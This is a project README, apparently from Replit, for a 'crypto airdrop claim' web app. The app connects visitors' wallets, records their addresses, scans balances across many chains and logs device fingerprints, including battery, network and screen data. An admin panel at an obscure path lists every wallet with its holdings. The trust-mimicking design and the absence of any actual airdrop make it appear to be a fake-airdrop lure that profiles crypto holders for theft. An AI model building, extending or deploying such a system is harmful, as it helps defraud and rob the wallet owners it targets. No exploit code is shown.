# Crypto Airdrop Claim System

## Overview

This is a cryptocurrency airdrop claim system built as a full-stack web application. Users connect their crypto wallets (MetaMask, Trust Wallet, Binance) to claim airdrops. The system captures wallet addresses, fetches blockchain balances across multiple chains (Ethereum, BSC, Polygon), and records device information. It features a public-facing claim interface and an admin dashboard for monitoring all claims.

The application follows Web3 design principles with glassmorphism effects, mobile-first responsive design, and a trust-focused aesthetic inspired by leading crypto applications like Phantom Wallet and Uniswap.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Framework**: React 18 with TypeScript, using Vite as the build tool and development server.

**Routing**: Wouter for lightweight client-side routing with two main routes:
- `/` - Public airdrop claim interface
- `/admin` - Administrative dashboard for viewing all claims
- `*` - 404 Not Found page

**UI Component System**: Radix UI primitives with shadcn/ui styling convention using the "new-york" style variant. Components follow a consistent design system with:
- Tailwind CSS for utility-first styling
- CSS variables for theming (light/dark mode support)
- Custom color palette optimized for crypto/Web3 aesthetics
- Responsive design with mobile-first breakpoints

**State Management**: 
- TanStack Query (React Query) for server state management with disabled auto-refetch
- Local storage for persisting wallet connection and claim status
- Component-level state with React hooks

**Key Design Decisions**:
- Mobile-optimized touch targets and thumb-zone placement for primary actions
- Glassmorphism effects using backdrop-blur and semi-transparent backgrounds
- Typography hierarchy using Inter/DM Sans for primary text and JetBrains Mono for wallet addresses
- Trust-first visual language with clean, professional aesthetics

### Backend Architecture

**Runtime**: Node.js with Express.js server framework, using ESM modules.

**API Design**: RESTful JSON API with three main endpoints:
- `GET /api/claims` - Retrieve all claims (admin)
- `GET /api/claims/:walletAddress` - Retrieve specific claim by wallet
- `POST /api/claims` - Create or update claim

**Request Processing**:
- JSON body parsing with raw body preservation for potential signature verification
- Request logging middleware that captures response JSON for debugging
- Error handling with proper HTTP status codes (404, 500)

**Data Validation**: Zod schema validation using drizzle-zod for runtime type safety on incoming claim data.

### Data Storage

**Database**: PostgreSQL via Neon serverless with WebSocket connections for edge compatibility.

**ORM**: Drizzle ORM with type-safe query builder and automatic TypeScript type generation.

**Schema Design**:
- Single `claims` table with serial ID primary key
- Unique constraint on `walletAddress` field
- JSONB column for flexible crypto balance storage across multiple chains/tokens
- Device information fields (model, browser, OS, network, battery, screen)
- Timestamps for claim creation and updates

**Storage Layer**: Abstracted through `IStorage` interface with `DatabaseStorage` implementation, enabling future storage backend changes without modifying business logic.

**Data Model Philosophy**: The balances are stored as JSONB to accommodate various cryptocurrencies and chains without schema migrations. This provides flexibility for adding new tokens (ETH, BNB, USDT variants, USDC, DAI, MATIC, AVAX, SOL, etc.).

### External Dependencies

**Blockchain Integration**:
- Ethers.js v6 for Web3 provider interaction and wallet communication
- Multiple RPC endpoints for different chains:
  - Ethereum Mainnet (LlamaRPC)
  - Binance Smart Chain (BSC Dataseed)
  - Polygon (Polygon RPC)
- ERC20 token balance checking via contract ABI
- Web3 wallet browser extensions (MetaMask, Binance, Trust Wallet) via `window.ethereum` provider
- Personal message signing for wallet ownership verification

**Database Services**:
- Neon Serverless PostgreSQL with WebSocket support
- Connection pooling via `@neondatabase/serverless`
- Environment variable configuration for `DATABASE_URL`

**UI Component Libraries**:
- Radix UI primitives for accessible, unstyled components
- React Icons (specifically Simple Icons) for wallet and crypto logos
- Lucide React for general iconography
- Embla Carousel for potential carousel implementations
- CMDK for command palette functionality

**Development Tools**:
- Drizzle Kit for database migrations and schema management
- TSX for TypeScript execution in development
- ESBuild for production bundling
- Vite plugins for Replit integration (runtime error overlay, cartographer, dev banner)

**Authentication Flow**: The system uses Web3 wallet signatures for verifying wallet ownership. Users sign a message containing their wallet address and timestamp, proving they control the private keys without exposing them.

**Device Information Collection**: The frontend collects comprehensive device metadata using browser APIs (navigator.userAgent, screen dimensions, battery status, network information) to provide context for each claim, stored as separate fields in the database.

## Replit Environment Setup

### Recent Changes (November 12, 2025)

**Initial Replit Configuration**:
- Configured Vite to allow all hosts for Replit proxy compatibility
- Set up workflow to run development server on port 5000
- Added missing `deleteAllClaims()` method to storage interface
- Created .gitignore file for Node.js project
- Configured deployment settings for autoscale deployment target
- **Database Migrations Completed**: Ran `npm run db:push` to create the claims table
- **CRITICAL BUG FIX**: Fixed wallet connection not saving to database
  - Modified `handleWalletConnected` in home.tsx to call API
  - Now properly fetches all cryptocurrency balances
  - Saves wallet address, balances, device info, and wallet type to database
  - All data now appears in admin panel at `/piadminhu`
- **App is now fully functional**: All wallet connections, balance scanning, and data saving features are working

### Database Setup

**STATUS**: ✅ Database is set up and working!

The database has been provisioned and migrations have been run successfully. The `claims` table is ready to store wallet connections.

**Database Schema**: The app uses Drizzle ORM with a single `claims` table that stores:
- Wallet addresses (unique)
- Crypto balances as JSONB (ETH, BNB, MATIC, BTC, SOL, TRX, TON, USDT variants, USDC, DAI, etc.)
- Device information (browser, OS, network, battery, screen size)
- Wallet type (MetaMask, Trust Wallet, Binance, etc.)
- Timestamps for claim creation and updates

### Admin Dashboard

Access the admin panel at: **`/piadminhu`**

The admin dashboard shows:
- All connected wallets
- Cryptocurrency balances for each wallet
- Device information for each connection
- Ability to delete all claims

### Running the Application

**Development Mode**:
- Run: `npm run dev` (already configured in workflow)
- Server runs on port 5000 (both API and frontend)
- Vite dev server integrated with Express for hot reload

**Production Build**:
- Build: `npm run build`
- Start: `npm start`
- Deployment configured for Replit's autoscale deployment

### Port Configuration

- **Port 5000**: Single unified server (Express + Vite middleware in dev, static files in production)
- Frontend Vite dev server runs on port 5173 internally but is proxied through Express
- All traffic goes through port 5000 which is the only exposed port

### Environment Variables Required

- `DATABASE_URL`: PostgreSQL connection string (auto-set when database is provisioned)
- `NODE_ENV`: Set to "development" or "production" (auto-set by npm scripts)

### Known Configuration

**Vite Configuration**:
- Configured to allow all hosts (`host: "0.0.0.0"`)
- HMR client port set to 443 for Replit proxy compatibility
- Port 5173 for internal Vite dev server

**Express Configuration**:
- Always serves on port 5000 (reads from PORT env variable, defaults to 5000)
- Serves both API routes and Vite-powered frontend
- In development: Uses Vite middleware for hot reload
- In production: Serves static files from dist/public

### Wallet Detection & Connection Features

**Browser Detection**: ✅ Working
- App automatically detects if opened in regular browser (Chrome, Safari) vs wallet browser
- If opened in regular browser: Shows instructions to open in wallet app
- If opened in wallet browser: Shows wallet connection modal

**Supported Wallets**: ✅ All major wallets
- MetaMask
- Trust Wallet
- Binance Wallet
- Coinbase Wallet
- TokenPocket
- Brave Wallet
- Rabby Wallet
- And any Web3-compatible wallet

**Cryptocurrency Balance Scanning**: ✅ Working
The app scans and displays balances for:
- **ETH** (Ethereum)
- **BNB** (Binance Smart Chain)
- **MATIC** (Polygon)
- **BTC** (Bitcoin)
- **SOL** (Solana)
- **TRX** (Tron)
- **TON** (The Open Network)
- **USDT** (ERC20, BEP20, TRC20 variants)
- **USDC** (USD Coin)
- **DAI** (Dai Stablecoin)

**Data Persistence**: ✅ Working
- Wallet addresses, balances, and device info are saved to PostgreSQL
- Admin panel displays all connected wallets
- Data persists across sessions